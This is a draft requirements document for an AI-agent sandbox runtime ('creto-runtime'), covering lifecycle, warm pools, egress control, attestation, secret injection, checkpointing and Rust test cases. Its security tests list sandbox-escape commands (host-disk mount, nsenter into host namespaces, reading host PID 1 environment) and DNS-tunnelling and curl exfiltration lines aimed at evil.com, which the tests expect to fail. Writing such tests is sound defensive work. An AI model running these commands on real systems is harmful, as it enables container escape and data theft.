---
status: draft
author: Runtime Lead Agent
created: 2024-12-25
updated: 2024-12-25
reviewers: []
github_issue: "#4"
oss_reference: kubernetes-sigs/agent-sandbox
---

# RTM-01: Runtime Product Requirements

## Purpose

This document defines the functional and non-functional requirements for **creto-runtime**, the sandboxed execution environment for AI agents within the Creto Enablement Layer. It extracts proven patterns from Agent Sandbox and extends them with Sovereign primitives (NHI, Crypto-Agility, Authorization).

## Scope

**In Scope:**
- Sandbox lifecycle management (Create, Start, Stop, Delete)
- Warm pool management for fast allocation
- Multiple runtime backends (gVisor, Kata Containers)
- Network egress control via Authorization
- Platform attestation and identity binding
- NHI-delegated secret injection
- Checkpoint/restore for migration

**Out of Scope:**
- Kubernetes operator implementation (separate component)
- Image registry management
- GPU/accelerator passthrough (v2)
- Confidential computing (SGX/TDX) (v2)
- Container orchestration (not a replacement for K8s)

---

## 1. Functional Requirements

### FR-RTM-001: Sandbox Lifecycle Management

**Priority:** CRITICAL
**OSS Reference:** Agent Sandbox `Sandbox` CRD lifecycle

**Description:**
The system shall provide complete lifecycle management for sandboxed execution environments, enabling creation, monitoring, execution, and termination of isolated agent runtimes.

**Acceptance Criteria:**
- AC-1.1: Spawn new sandbox from `SandboxSpec` with agent NHI binding
- AC-1.2: Terminate running sandbox and clean up resources
- AC-1.3: Query sandbox status (Creating, Running, Paused, Terminated, Failed)
- AC-1.4: Execute commands within running sandbox with I/O capture
- AC-1.5: Support graceful shutdown with configurable timeout
- AC-1.6: Automatic cleanup on TTL expiration or idle timeout

**Dependencies:**
- creto-nhi (agent identity binding)
- creto-authz (spawn authorization check)
- creto-audit (lifecycle event logging)

**Constraints:**
- Maximum 1000 concurrent sandboxes per runtime instance
- Sandbox ID must be globally unique
- Lifecycle transitions must be atomic and logged

**Test Cases:**
```rust
#[test]
async fn test_sandbox_spawn_and_terminate() {
    let runtime = GVisorRuntime::new().await?;
    let spec = SandboxSpec {
        image: "agent-base:v1".into(),
        agent_nhi: test_agent_identity(),
        // ...
    };

    // Spawn
    let handle = runtime.spawn(&spec).await?;
    assert_eq!(handle.status, SandboxStatus::Ready);

    // Terminate
    runtime.terminate(&handle).await?;
    let status = runtime.status(&handle).await?;
    assert_matches!(status, SandboxStatus::Terminated { .. });
}
```

---

### FR-RTM-002: Warm Pool Management

**Priority:** HIGH
**OSS Reference:** Agent Sandbox `SandboxWarmPool` CRD

**Description:**
The system shall maintain pools of pre-warmed sandboxes to reduce allocation latency from seconds to sub-100ms, enabling interactive agent execution.

**Acceptance Criteria:**
- AC-2.1: Create warm pool from `SandboxTemplate` with configurable min/max size
- AC-2.2: Pre-warm sandboxes without NHI binding (bound on claim)
- AC-2.3: Claim sandbox from pool, bind NHI, return handle in <100ms (p99)
- AC-2.4: Release sandbox back to pool (reusable) or terminate (single-use)
- AC-2.5: Auto-scale pool based on claim rate and ready count
- AC-2.6: Evict sandboxes older than `max_age` from pool
- AC-2.7: Provide pool statistics (ready, in-use, warming, avg claim latency)

**Dependencies:**
- FR-RTM-001 (sandbox lifecycle)
- creto-nhi (NHI binding on claim)

**Constraints:**
- Pool size: 1 ≤ min_ready ≤ max_ready ≤ 100
- Reusable pools must reset filesystem state between uses
- Pool statistics updated every 10 seconds

**Test Cases:**
```rust
#[test]
async fn test_warmpool_claim_latency() {
    let pool = WarmPool {
        template: base_spec(),
        min_ready: 5,
        max_ready: 20,
        reusable: true,
    };

    let pool_id = runtime.create_pool(pool).await?;

    // Wait for pool to warm
    tokio::time::sleep(Duration::from_secs(5)).await;

    // Measure claim latency
    let start = Instant::now();
    let handle = runtime.claim(&pool_id, &agent_nhi, &[]).await?;
    let latency = start.elapsed();

    assert!(latency < Duration::from_millis(100), "Claim took {:?}", latency);
}
```

---

### FR-RTM-003: Runtime Selection and Backend Abstraction

**Priority:** HIGH
**OSS Reference:** Agent Sandbox runtime abstraction (gVisor, Kata backends)

**Description:**
The system shall support multiple isolation backends (gVisor, Kata Containers) through a unified `SandboxRuntime` trait, allowing users to select security/performance tradeoffs.

**Acceptance Criteria:**
- AC-3.1: Implement `SandboxRuntime` trait for gVisor backend
- AC-3.2: Implement `SandboxRuntime` trait for Kata Containers backend
- AC-3.3: Support runtime selection via `SandboxSpec.runtime_class`
- AC-3.4: Provide runtime capabilities query (syscall coverage, isolation level)
- AC-3.5: Automatic fallback to available runtime if preferred unavailable
- AC-3.6: Runtime-specific configuration (gVisor platform, Kata hypervisor)

**Dependencies:**
- gVisor runsc binary (≥ v2023.12.0)
- Kata runtime (≥ v3.2.0)
- containerd or CRI-compatible runtime

**Constraints:**
- gVisor: User-space kernel, ~200 syscalls, fast startup
- Kata: VM isolation, full syscall support, slower startup
- Runtime availability checked at service initialization

**Comparison Matrix:**

| Aspect | gVisor | Kata Containers |
|--------|--------|-----------------|
| Isolation Model | User-space kernel | Lightweight VM |
| Cold Start | <2s (p99) | <5s (p99) |
| Syscall Coverage | ~200 syscalls | Full Linux kernel |
| Best For | High-throughput, interactive | Regulated, highest security |
| Memory Overhead | ~50MB | ~100MB |

**Test Cases:**
```rust
#[test]
async fn test_runtime_backend_selection() {
    let spec_gvisor = SandboxSpec {
        runtime_class: RuntimeClass::GVisor,
        // ...
    };
    let handle = runtime.spawn(&spec_gvisor).await?;
    assert_eq!(handle.runtime, "gvisor");

    let spec_kata = SandboxSpec {
        runtime_class: RuntimeClass::Kata,
        // ...
    };
    let handle = runtime.spawn(&spec_kata).await?;
    assert_eq!(handle.runtime, "kata");
}
```

---

### FR-RTM-004: Network Egress Control

**Priority:** CRITICAL
**OSS Reference:** Kubernetes NetworkPolicy (extended with dynamic AuthZ)

**Description:**
The system shall enforce network egress policies via Authorization service, intercepting outbound connections and checking policy before allowing traffic to external destinations.

**Acceptance Criteria:**
- AC-4.1: Intercept outbound connections at network layer (gVisor netstack, Kata iptables)
- AC-4.2: Evaluate local `NetworkPolicy` rules (CIDR, domain, service refs)
- AC-4.3: Call Authorization service for `RequireAuthz` destinations
- AC-4.4: Allow/deny connection based on policy decision
- AC-4.5: Log egress attempts (allowed and denied) to Audit
- AC-4.6: Support DNS policy (allowed resolvers, domain filtering)
- AC-4.7: Enforce egress check latency <1ms (p99)

**Dependencies:**
- creto-authz (egress authorization check)
- creto-audit (egress logging)
- Runtime network interception capability

**Constraints:**
- Authorization check: 168ns (policy eval) + network overhead ~1ms total
- DNS resolution: only to approved resolvers
- Default deny unless explicitly allowed

**Policy Example:**
```yaml
network_policy:
  default_action: Deny
  egress_rules:
    - destination: "*.creto.ai"
      action: Allow
    - destination: "api.anthropic.com"
      action: RequireAuthz
    - destination: "0.0.0.0/0"
      action: Deny
  dns_policy:
    allowed_resolvers: ["8.8.8.8", "1.1.1.1"]
```

**Test Cases:**
```rust
#[test]
async fn test_egress_enforcement() {
    let spec = SandboxSpec {
        network_policy: NetworkPolicy {
            default_action: NetworkAction::Deny,
            egress_rules: vec![
                EgressRule {
                    destination: EgressDestination::Domain("*.example.com".into()),
                    action: NetworkAction::Allow,
                },
            ],
        },
        // ...
    };

    let handle = runtime.spawn(&spec).await?;

    // Allowed destination
    let result = runtime.exec(&handle, Command::new("curl https://api.example.com")).await;
    assert!(result.is_ok());

    // Denied destination
    let result = runtime.exec(&handle, Command::new("curl https://evil.com")).await;
    assert!(result.is_err());
}
```

---

### FR-RTM-005: Attestation and Identity Binding

**Priority:** HIGH
**OSS Reference:** New capability (not in Agent Sandbox)

**Description:**
The system shall generate cryptographic attestations linking sandbox execution to agent identity and configuration, enabling third-party verification of "who ran what, where."

**Acceptance Criteria:**
- AC-5.1: Generate `Attestation` at sandbox spawn with platform evidence
- AC-5.2: Include agent NHI, delegation chain in attestation
- AC-5.3: Hash image layers, sandbox config, initial filesystem state
- AC-5.4: Sign attestation with runtime signing key (Ed25519 + ML-DSA)
- AC-5.5: Support platform-specific evidence (gVisor version, Kata measurement)
- AC-5.6: Provide attestation verification function for third parties
- AC-5.7: Attestation valid for sandbox lifetime, expires on termination

**Dependencies:**
- creto-nhi (agent identity)
- creto-crypto (signing, verification)
- Runtime platform (gVisor, Kata)

**Constraints:**
- Attestation generation: <50ms
- Signature verification: <5ms
- Attestation size: <10KB

**Attestation Structure:**
```rust
pub struct Attestation {
    pub sandbox_id: SandboxId,
    pub agent_nhi: AgentIdentity,
    pub delegation_chain: Vec<AgentIdentity>,

    // Configuration hashes
    pub image_hash: Hash,       // SHA-256 of OCI image
    pub config_hash: Hash,      // SHA-256 of SandboxSpec
    pub init_hash: Hash,        // SHA-256 of initial FS

    // Platform proof
    pub platform: AttestationPlatform,
    pub platform_evidence: Vec<u8>,

    // Timing
    pub created_at: Timestamp,
    pub valid_until: Timestamp,

    // Signature (Ed25519 + ML-DSA hybrid)
    pub signature: Signature,
}
```

**Test Cases:**
```rust
#[test]
async fn test_attestation_generation_and_verification() {
    let handle = runtime.spawn(&spec).await?;
    let attestation = runtime.get_attestation(&handle.id).await?;

    // Verify signature
    assert!(verify_attestation(&attestation).is_ok());

    // Verify identity binding
    assert_eq!(attestation.agent_nhi, spec.agent_nhi);

    // Verify freshness
    assert!(attestation.created_at <= now());
    assert!(attestation.valid_until > now());
}
```

---

### FR-RTM-006: NHI-Delegated Secret Injection

**Priority:** HIGH
**OSS Reference:** Kubernetes Secrets (extended with NHI delegation)

**Description:**
The system shall inject secrets into sandboxes via NHI delegation, enabling agents to access credentials scoped to their identity without hardcoding or static configuration.

**Acceptance Criteria:**
- AC-6.1: Support `SecretRef` in `SandboxSpec` with NHI delegation scope
- AC-6.2: Fetch secrets from NHI delegation service at spawn time
- AC-6.3: Inject secrets as files with configurable path and mode
- AC-6.4: Inject secrets as environment variables
- AC-6.5: Support secret rotation (re-inject on lease renewal)
- AC-6.6: Clear secrets from memory after sandbox termination
- AC-6.7: Log secret injection events (audit trail, no plaintext)

**Dependencies:**
- creto-nhi (delegation service)
- creto-audit (secret access logging)

**Constraints:**
- Maximum 50 secrets per sandbox
- Secret TTL ≤ sandbox TTL
- Secrets cleared on termination within 1 second

**Secret Configuration:**
```rust
pub struct SecretRef {
    pub name: String,
    pub source: SecretSource::NhiDelegated {
        secret_id: "api-key-anthropic",
        delegation_scope: DelegationScope {
            resource: "api.anthropic.com",
            actions: vec!["read"],
            ttl: Duration::from_secs(3600),
        },
    },
    pub mount: SecretMount::EnvVar { name: "ANTHROPIC_API_KEY" },
}
```

**Test Cases:**
```rust
#[test]
async fn test_secret_injection() {
    let spec = SandboxSpec {
        secrets: vec![
            SecretRef {
                name: "api-key".into(),
                source: SecretSource::NhiDelegated { /* ... */ },
                mount: SecretMount::EnvVar { name: "API_KEY".into() },
            },
        ],
        // ...
    };

    let handle = runtime.spawn(&spec).await?;

    // Verify secret is available in sandbox
    let output = runtime.exec(&handle, Command::new("printenv API_KEY")).await?;
    assert!(output.stdout.starts_with("sk-"));
}
```

---

### FR-RTM-007: Checkpoint and Restore

**Priority:** MEDIUM
**OSS Reference:** GKE Pod Snapshots, CRIU (Checkpoint/Restore In Userspace)

**Description:**
The system shall support checkpointing sandbox state (CPU, memory, filesystem) and restoring to enable migration, fault tolerance, and cold-start optimization.

**Acceptance Criteria:**
- AC-7.1: Checkpoint running sandbox to durable storage
- AC-7.2: Restore sandbox from checkpoint with same or different NHI
- AC-7.3: Checkpoint includes: memory state, CPU registers, filesystem delta
- AC-7.4: Checkpoint size <100MB for typical agent workload
- AC-7.5: Restore latency <1s (faster than cold start)
- AC-7.6: Support checkpoint migration between hosts (same runtime)
- AC-7.7: Checkpoint metadata includes agent NHI, original spec

**Dependencies:**
- CRIU (for gVisor/Kata checkpoint)
- Durable storage (S3-compatible)

**Constraints:**
- Checkpoint: <10s for 1GB sandbox
- Restore: <1s (warm), <5s (cold + checkpoint)
- Checkpoint retention: 24 hours default

**Test Cases:**
```rust
#[test]
async fn test_checkpoint_restore() {
    let handle = runtime.spawn(&spec).await?;

    // Run some work
    runtime.exec(&handle, Command::new("echo hello > /tmp/state.txt")).await?;

    // Checkpoint
    let checkpoint_id = runtime.checkpoint(&handle.id).await?;
    runtime.terminate(&handle).await?;

    // Restore
    let restored_handle = runtime.restore(&checkpoint_id, None).await?;

    // Verify state persisted
    let output = runtime.exec(&restored_handle, Command::new("cat /tmp/state.txt")).await?;
    assert_eq!(output.stdout, "hello\n");
}
```

---

## 2. Non-Functional Requirements

### NFR-RTM-001: Cold Spawn Latency

**Priority:** HIGH
**Metric:** p99 latency for sandbox spawn from image

**Requirements:**
- gVisor backend: <2s (p99)
- Kata backend: <5s (p99)

**Measurement:**
```rust
// Time from runtime.spawn() call to SandboxStatus::Ready
let start = Instant::now();
let handle = runtime.spawn(&spec).await?;
let latency = start.elapsed();
// latency must be <2s for gVisor, <5s for Kata
```

**Rationale:**
Cold start latency impacts user experience for interactive agent tasks. gVisor's user-space kernel enables faster startup than Kata's VM model.

---

### NFR-RTM-002: Warm Pool Claim Latency

**Priority:** CRITICAL
**Metric:** p99 latency for claiming pre-warmed sandbox

**Requirements:**
- Warm pool claim: <100ms (p99)
- Includes NHI binding and attestation generation

**Measurement:**
```rust
let start = Instant::now();
let handle = warmpool.claim(&pool_id, &agent_nhi, &[]).await?;
let latency = start.elapsed();
// latency must be <100ms
```

**Rationale:**
Sub-100ms allocation enables interactive agent execution patterns similar to function-as-a-service (Lambda, Cloud Functions).

---

### NFR-RTM-003: Egress Authorization Latency

**Priority:** HIGH
**Metric:** p99 latency for egress authorization check

**Requirements:**
- Network egress check: <1ms (p99)
- Includes Authorization service call (168ns) + network overhead

**Measurement:**
```rust
// Measured from connection intercept to allow/deny decision
let start = Instant::now();
let decision = network_enforcer.check_egress(&dest).await?;
let latency = start.elapsed();
// latency must be <1ms
```

**Rationale:**
Egress checks are on critical path for every outbound connection. Must not introduce noticeable latency for agent HTTP/gRPC calls.

---

### NFR-RTM-004: Sandbox Resource Isolation

**Priority:** CRITICAL
**Metric:** Memory, CPU, network isolation guarantees

**Requirements:**
- Memory: Hard limit enforced, OOM kills sandbox (not host)
- CPU: Throttling at configured millicores, no starvation of host
- Network: Bandwidth limiting, connection limits per sandbox
- PID: Namespace isolation, PID limit enforcement
- Filesystem: Read-only root, writable volumes with size limits

**Verification:**
- gVisor: User-space kernel enforces resource limits
- Kata: cgroups + VM isolation

**Rationale:**
Prevent noisy neighbor attacks and resource exhaustion. Critical for multi-tenant agent hosting.

---

### NFR-RTM-005: Attestation Security

**Priority:** HIGH
**Metric:** Cryptographic strength and verifiability

**Requirements:**
- Signature algorithm: Ed25519 + ML-DSA (PQC hybrid)
- Hash algorithm: SHA-256 for image/config, SHA3-256 for consensus anchoring
- Platform evidence: Verifiable by third party without runtime trust
- Key rotation: Support for signing key rotation with 30-day overlap

**Verification:**
- Attestation signatures verified by external validator
- Platform evidence matches expected measurements

**Rationale:**
Attestations are legal evidence in compliance audits. Must be cryptographically sound and independently verifiable.

---

### NFR-RTM-006: Throughput and Concurrency

**Priority:** MEDIUM
**Metric:** Concurrent sandboxes per runtime instance

**Requirements:**
- Concurrent sandboxes: ≥1000 per runtime instance (64 vCPU, 256GB RAM)
- Spawn rate: ≥50 sandboxes/second (cold start)
- Claim rate: ≥500 sandboxes/second (warm pool)

**Measurement:**
```bash
# Benchmark concurrent spawns
cargo bench -p creto-runtime -- concurrent_spawn
```

**Rationale:**
Support high-throughput agent execution for swarm orchestration and batch workloads.

---

### NFR-RTM-007: Availability and Fault Tolerance

**Priority:** HIGH
**Metric:** Service uptime and recovery time

**Requirements:**
- Service availability: 99.9% uptime
- Sandbox crash recovery: Automatic restart on failure (if configured)
- Graceful degradation: Continue operation if warm pool unavailable (fall back to cold start)
- Checkpoint durability: ≥3 replicas, <1% data loss on node failure

**Rationale:**
Agent execution is on critical path for AI-powered workflows. Service must be highly available.

---

## 3. User Stories

### US-RTM-001: Agent Spawn with Identity Binding

**As a** platform orchestrator
**I want to** spawn an isolated sandbox for an AI agent with cryptographic identity binding
**So that** I can ensure the agent runs in a secure environment tied to its NHI

**Acceptance Criteria:**
- Spawn sandbox from OCI image reference
- Bind agent NHI at spawn time (not post-creation)
- Receive attestation proving identity binding
- Sandbox isolated from other agents and host

**Example:**
```rust
let spec = SandboxSpec {
    image: ImageRef::from("agent-executor:v1.2.0"),
    agent_nhi: agent_identity,
    delegation_chain: vec![human_principal],
    resource_limits: ResourceLimits {
        cpu_millicores: 1000,  // 1 CPU
        memory_bytes: 2 * 1024 * 1024 * 1024,  // 2GB
    },
    // ...
};

let handle = runtime.spawn(&spec).await?;
let attestation = runtime.get_attestation(&handle.id).await?;

// Verify attestation before trusting sandbox
verify_attestation(&attestation)?;
```

---

### US-RTM-002: Fast Allocation from Warm Pool

**As a** real-time agent controller
**I want to** claim a pre-warmed sandbox in <100ms
**So that** my agent can start executing tasks without user-facing latency

**Acceptance Criteria:**
- Claim latency <100ms (p99)
- NHI bound to claimed sandbox
- Attestation generated at claim time
- No state leakage from previous sandbox use

**Example:**
```rust
// Pre-create warm pool for common agent profiles
let pool = WarmPool {
    id: "agent-executor-pool".into(),
    template: base_sandbox_spec(),
    min_ready: 10,
    max_ready: 50,
    reusable: true,
};

runtime.create_pool(pool).await?;

// Fast claim when agent task arrives
let start = Instant::now();
let handle = runtime.claim(
    &"agent-executor-pool".into(),
    &agent_nhi,
    &delegation_chain,
).await?;
let claim_latency = start.elapsed();

assert!(claim_latency < Duration::from_millis(100));
```

---

### US-RTM-003: Controlled Network Egress

**As a** security engineer
**I want to** enforce network egress policies on agent sandboxes
**So that** I can prevent data exfiltration and unauthorized API calls

**Acceptance Criteria:**
- Default deny all egress traffic
- Allow specific domains/CIDRs via policy
- Require Authorization check for sensitive destinations
- Log all egress attempts (allowed and denied)

**Example:**
```rust
let spec = SandboxSpec {
    network_policy: NetworkPolicy {
        default_action: NetworkAction::Deny,
        egress_rules: vec![
            // Allow internal services
            EgressRule {
                destination: EgressDestination::CidrBlock("10.0.0.0/8".parse()?),
                action: NetworkAction::Allow,
            },
            // Require AuthZ for external APIs
            EgressRule {
                destination: EgressDestination::Domain("*.anthropic.com".into()),
                action: NetworkAction::RequireAuthz,
            },
        ],
    },
    // ...
};

// Authorization check happens transparently on connection attempt
// If denied, connection fails with ECONNREFUSED
```

---

### US-RTM-004: NHI-Delegated Secret Access

**As a** agent developer
**I want to** access API keys and credentials via NHI delegation
**So that** I don't need to hardcode secrets or manage static configuration

**Acceptance Criteria:**
- Declare secret requirements in `SandboxSpec`
- Secrets fetched via NHI delegation service at spawn
- Secrets available as environment variables or files
- Secrets automatically rotated on lease renewal

**Example:**
```rust
let spec = SandboxSpec {
    secrets: vec![
        SecretRef {
            name: "anthropic-key".into(),
            source: SecretSource::NhiDelegated {
                secret_id: "api-key-anthropic".into(),
                delegation_scope: DelegationScope {
                    resource: "api.anthropic.com".into(),
                    actions: vec!["read".into()],
                    ttl: Duration::from_secs(3600),
                },
            },
            mount: SecretMount::EnvVar { name: "ANTHROPIC_API_KEY".into() },
        },
    ],
    // ...
};

// Inside sandbox:
// $ printenv ANTHROPIC_API_KEY
// sk-ant-api03-...
```

---

### US-RTM-005: Attestation Verification for Compliance

**As a** compliance auditor
**I want to** verify cryptographic attestations of agent execution
**So that** I can prove which agent ran what code in which environment

**Acceptance Criteria:**
- Attestation includes agent NHI, delegation chain, image hash, config hash
- Attestation signed by runtime with verifiable key
- Third-party verification without runtime access
- Attestation anchored in immutable audit log

**Example:**
```rust
// Fetch attestation from audit log
let attestation = audit_service.get_attestation(&sandbox_id).await?;

// Verify independently
let verification_result = verify_attestation(&attestation)?;

assert_eq!(verification_result.agent_nhi, expected_agent);
assert_eq!(verification_result.image_hash, expected_image_digest);
assert!(verification_result.signature_valid);

// Present to auditor as legal evidence
generate_compliance_report(attestation)?;
```

---

### US-RTM-006: Checkpoint and Migrate Agent

**As a** platform operator
**I want to** checkpoint a running agent and restore on a different host
**So that** I can perform maintenance without interrupting agent workflows

**Acceptance Criteria:**
- Checkpoint includes CPU, memory, filesystem state
- Restore continues execution from checkpoint point
- Migration transparent to agent code
- Checkpoint secure (encrypted, signed)

**Example:**
```rust
// Before maintenance: checkpoint all sandboxes on host A
for handle in runtime.list_sandboxes().await? {
    let checkpoint_id = runtime.checkpoint(&handle.id).await?;
    store_checkpoint_metadata(&checkpoint_id, &handle.spec).await?;
}

// After maintenance: restore on host B
for checkpoint_id in list_checkpoints().await? {
    let handle = runtime.restore(&checkpoint_id, None).await?;
    // Agent continues execution
}
```

---

## 4. OSS Pattern Extraction (Agent Sandbox)

### 4.1 Sandbox CRD Pattern

**Agent Sandbox:**
```yaml
apiVersion: agent-sandbox.k8s.io/v1alpha1
kind: Sandbox
metadata:
  name: agent-executor-123
spec:
  image: agent-base:v1
  resources:
    cpu: "1"
    memory: 2Gi
  runtimeClassName: gvisor
```

**Creto Adaptation:**
```rust
pub struct SandboxSpec {
    pub image: ImageRef,
    pub agent_nhi: AgentIdentity,          // NEW: Cryptographic identity
    pub delegation_chain: Vec<AgentIdentity>,  // NEW: Lineage
    pub resource_limits: ResourceLimits,
    pub runtime_class: RuntimeClass,
    pub attestation_policy: AttestationPolicy,  // NEW: Cryptographic proof
    pub network_policy: NetworkPolicy,     // NEW: AuthZ-enforced egress
}
```

---

### 4.2 Warm Pool Pattern

**Agent Sandbox:**
```yaml
apiVersion: agent-sandbox.k8s.io/v1alpha1
kind: SandboxWarmPool
metadata:
  name: agent-pool
spec:
  template:
    spec:
      image: agent-base:v1
  minReady: 5
  maxReady: 20
```

**Creto Adaptation:**
```rust
pub struct WarmPool {
    pub id: PoolId,
    pub template: SandboxSpec,  // Base spec, no NHI yet
    pub min_ready: usize,
    pub max_ready: usize,
    pub max_age: Duration,      // NEW: Evict old sandboxes
    pub reusable: bool,         // NEW: Single-use vs multi-use
}

// Claim binds NHI to pre-warmed sandbox
async fn claim(
    &self,
    pool_id: &PoolId,
    agent_nhi: &AgentIdentity,  // Bound at claim time
    delegation_chain: &[AgentIdentity],
) -> Result<SandboxHandle, Error>;
```

---

### 4.3 Runtime Abstraction Pattern

**Agent Sandbox:**
- Pluggable runtime backends (gVisor, Kata)
- Runtime selected via `runtimeClassName`
- Backend-specific configuration

**Creto Adaptation:**
```rust
#[async_trait]
pub trait SandboxRuntime: Send + Sync {
    fn runtime_id(&self) -> &str;
    async fn spawn(&self, spec: &SandboxSpec) -> Result<SandboxHandle, Error>;
    async fn terminate(&self, handle: &SandboxHandle) -> Result<(), Error>;
    async fn attest(&self, handle: &SandboxHandle) -> Result<Attestation, Error>;  // NEW
    // ...
}

// Backend implementations
pub struct GVisorRuntime { /* ... */ }
pub struct KataRuntime { /* ... */ }
```

---

### 4.4 Differences from Agent Sandbox

| Aspect | Agent Sandbox | Creto Runtime |
|--------|---------------|---------------|
| **Identity** | K8s stable hostname | Agent NHI (cryptographic) |
| **Attestation** | None | Platform-signed proof |
| **Network** | Static NetworkPolicy | Dynamic AuthZ enforcement |
| **Secrets** | K8s Secrets | NHI-delegated leases |
| **Audit** | K8s events | Immutable, Merkle-anchored |
| **Deployment** | K8s operator | Library (operator separate) |

---

## 5. Performance Testing Strategy

### 5.1 Latency Benchmarks

```rust
// benches/spawn_latency.rs
#[bench]
fn bench_cold_spawn_gvisor(b: &mut Bencher) {
    b.iter(|| {
        runtime.spawn(&spec).await
    });
    // Assert p99 < 2s
}

#[bench]
fn bench_warmpool_claim(b: &mut Bencher) {
    b.iter(|| {
        runtime.claim(&pool_id, &agent_nhi, &[]).await
    });
    // Assert p99 < 100ms
}

#[bench]
fn bench_egress_check(b: &mut Bencher) {
    b.iter(|| {
        network_enforcer.check_egress(&dest).await
    });
    // Assert p99 < 1ms
}
```

---

### 5.2 Throughput Benchmarks

```rust
#[bench]
fn bench_concurrent_spawns(b: &mut Bencher) {
    b.iter(|| {
        let handles: Vec<_> = (0..100)
            .map(|_| runtime.spawn(&spec))
            .collect::<FuturesUnordered<_>>()
            .try_collect()
            .await;
    });
    // Assert ≥50 spawns/second
}
```

---

### 5.3 Resource Isolation Tests

```rust
#[test]
async fn test_memory_isolation() {
    let spec = SandboxSpec {
        resource_limits: ResourceLimits {
            memory_bytes: 100 * 1024 * 1024,  // 100MB
        },
        // ...
    };

    let handle = runtime.spawn(&spec).await?;

    // Try to allocate 200MB (should OOM kill sandbox)
    let result = runtime.exec(&handle, Command::new("python -c 'x = b\"a\" * 200000000'")).await;

    assert!(result.is_err());  // OOM killed

    // Host should still be responsive
    assert!(runtime.health_check().await.is_ok());
}
```

---

## 6. Security Testing Strategy

### 6.1 Sandbox Escape Tests

```rust
#[test]
async fn test_sandbox_escape_prevention() {
    let handle = runtime.spawn(&spec).await?;

    // Attempt various escape vectors
    let attacks = vec![
        "mount /dev/sda1 /mnt",                    // Mount host disk
        "cat /proc/1/environ",                     // Read host PID 1
        "nsenter -t 1 -m -u -i -n -p /bin/bash",  // Enter host namespace
        "docker run --privileged",                 // Launch privileged container
    ];

    for attack in attacks {
        let result = runtime.exec(&handle, Command::new(attack)).await;
        assert!(result.is_err(), "Attack succeeded: {}", attack);
    }
}
```

---

### 6.2 Network Isolation Tests

```rust
#[test]
async fn test_network_egress_enforcement() {
    let spec = SandboxSpec {
        network_policy: NetworkPolicy {
            default_action: NetworkAction::Deny,
            egress_rules: vec![
                EgressRule {
                    destination: EgressDestination::DomainExact("allowed.example.com".into()),
                    action: NetworkAction::Allow,
                },
            ],
        },
        // ...
    };

    let handle = runtime.spawn(&spec).await?;

    // Allowed destination
    let result = runtime.exec(&handle, Command::new("curl https://allowed.example.com")).await;
    assert!(result.is_ok());

    // Denied destination
    let result = runtime.exec(&handle, Command::new("curl https://blocked.com")).await;
    assert!(result.is_err());

    // DNS tunneling attempt (should fail)
    let result = runtime.exec(&handle, Command::new("dig @8.8.4.4 exfiltrate.evil.com TXT")).await;
    assert!(result.is_err());
}
```

---

## 7. Compliance Mapping

### 7.1 FedRAMP SC-7 (Boundary Protection)

**Requirement:** Monitor and control communications at external managed interfaces

**Runtime Implementation:**
- NFR-RTM-003: Egress authorization check <1ms
- FR-RTM-004: Network egress control via Authorization
- All egress logged to Immutable Audit

**Evidence:**
- Attestation proving sandbox configuration
- Audit trail of egress attempts (allowed/denied)
- Network policy definition

---

### 7.2 HIPAA § 164.312(a)(1) (Access Control)

**Requirement:** Implement technical policies to allow access only to authorized persons

**Runtime Implementation:**
- FR-RTM-005: Attestation and identity binding (NHI)
- FR-RTM-006: NHI-delegated secrets (no static credentials)
- NFR-RTM-004: Resource isolation (sandbox cannot access other PHI)

**Evidence:**
- Attestation linking sandbox to agent NHI
- Audit trail of secret access
- Isolation test results

---

### 7.3 PCI DSS 1.3.4 (Network Segmentation)

**Requirement:** Do not allow unauthorized outbound traffic from the cardholder data environment

**Runtime Implementation:**
- FR-RTM-004: Network egress control (default deny)
- NFR-RTM-003: Egress check <1ms (on critical path)
- Audit logging of all egress attempts

**Evidence:**
- Network policy configuration
- Egress denial logs
- Penetration test results (sandbox escape attempts)

---

## 8. Open Questions

1. **Live Migration:** Should we support live migration (migrate without checkpoint/restore)?
   - Complexity: High (requires CRIU or VM migration)
   - Benefit: Zero-downtime maintenance
   - Decision: Defer to v2, checkpoint/restore sufficient for v1

2. **Warm Pool Sizing:** Static vs dynamic pool sizing?
   - Static: Predictable cost, may waste resources
   - Dynamic: Auto-scale based on claim rate, more complex
   - Proposal: Start with static, add auto-scaling in v1.1

3. **Sandbox Reusability:** Can sandboxes be reused after release?
   - Security concern: State leakage between uses
   - Performance benefit: Avoid warm pool churn
   - Proposal: Support both reusable and single-use pools

4. **GPU Passthrough:** Support GPU/accelerator passthrough in v1?
   - Use case: ML model inference in sandbox
   - Complexity: Kata supports, gVisor does not
   - Decision: Defer to v2, focus on CPU workloads first

5. **Confidential Computing:** SGX/TDX support in v1?
   - Use case: Attestation with hardware root of trust
   - Complexity: Platform-specific, limited cloud availability
   - Decision: Defer to v2, software attestation sufficient for v1

---

## 9. Success Metrics

| Metric | Target | Measurement |
|--------|--------|-------------|
| Cold spawn latency (gVisor) | <2s (p99) | Benchmark suite |
| Warm pool claim latency | <100ms (p99) | Benchmark suite |
| Egress check latency | <1ms (p99) | Benchmark suite |
| Concurrent sandboxes | ≥1000 per instance | Load test |
| Spawn rate (cold) | ≥50/second | Load test |
| Claim rate (warm) | ≥500/second | Load test |
| Sandbox escape attempts | 0 successful | Security test suite |
| Attestation verification | 100% valid | Production monitoring |

---

## 10. Dependencies

### External Dependencies

| Dependency | Version | Purpose |
|------------|---------|---------|
| gVisor (runsc) | ≥2023.12.0 | User-space kernel runtime |
| Kata Containers | ≥3.2.0 | VM-based runtime |
| CRIU | ≥3.18 | Checkpoint/restore |
| containerd | ≥1.7.0 | OCI image management |

### Internal Dependencies (Creto Platform)

| Crate | Purpose |
|-------|---------|
| creto-nhi | Agent identity, delegation chains |
| creto-authz | Spawn authorization, egress enforcement |
| creto-crypto | Attestation signing, verification |
| creto-audit | Lifecycle logging, egress logging |

---

## 11. Revision History

| Date | Version | Author | Changes |
|------|---------|--------|---------|
| 2024-12-25 | 0.1 | Runtime Lead Agent | Initial draft |

---

## Appendix A: Glossary

- **Agent NHI:** Non-Human Identity cryptographically tied to an AI agent
- **Attestation:** Cryptographic proof linking sandbox execution to identity and configuration
- **Cold Start:** Spawning sandbox from image (2-5s)
- **Delegation Chain:** Lineage from agent to root human principal
- **Egress:** Outbound network traffic from sandbox
- **gVisor:** User-space kernel providing container isolation
- **Kata Containers:** Lightweight VM runtime for container isolation
- **Warm Pool:** Pre-warmed sandboxes ready for fast allocation (<100ms)

---

## Appendix B: References

1. **Agent Sandbox Specification**
   https://agent-sandbox.sigs.k8s.io/

2. **gVisor Documentation**
   https://gvisor.dev/docs/

3. **Kata Containers Architecture**
